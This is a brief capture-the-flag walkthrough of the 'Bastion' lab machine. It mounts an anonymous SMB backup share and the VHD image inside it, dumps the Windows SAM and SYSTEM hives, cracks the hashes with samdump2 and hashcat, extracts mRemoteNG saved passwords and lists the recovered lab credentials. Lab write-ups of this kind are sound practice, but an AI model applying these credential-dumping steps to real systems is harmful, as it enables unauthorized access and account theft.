# Bastion

Port scan shows 22, 139, 445 open. We find an unprotected share `/backups` which contains the backup archive of a Windows PC.

mount SMB share
```
sudo mount -t cifs //10.10.10.134/backup /mnt/vhd1 -o user=anonymous,password=anonymous
```

Mount the vhd file
```
sudo modprobe nbd
```

```
sudo qemu-nbd -r -c <new_device_name> <file>
```

```
mount -r <new_device_name> <mountpoint>
```

and then dump the SAM and SYSTEM files for cracking

```
cp c:\windows\system32\config\SAM .
cp c:\windows\system32\config\SYSTEM .
samdump2 SYSTEM SAM -o hashes
hashcat hashes /usr/share/wordlists/rockyou.txt
```

We now have user credentials

```
L4mpje
```

```
bureaulampje
```

In `%appdata%/mremoteng/confCons.xml` we find a few username/password combos

![[Pasted image 20220719184042.png]]

```
L4mpje
```



![[Pasted image 20220719184051.png]]

We used a tool from github to crack these hashes.

```
Administrator
```

```
thXLHM96BeKL0ER2
```

